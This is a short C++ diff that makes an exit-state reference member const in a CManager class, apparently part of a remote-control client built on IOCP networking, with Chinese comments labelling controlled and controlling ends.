@@ -33,7 +33,7 @@ HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
 class CManager : public IOCPManager 
 {
 public:
-	State&g_bExit; // 1-被控端退出 2-主控端退出
+	const State&g_bExit; // 1-被控端退出 2-主控端退出
 	BOOL m_bReady;
 	CManager(IOCPClient* ClientObject);
 	virtual ~CManager();
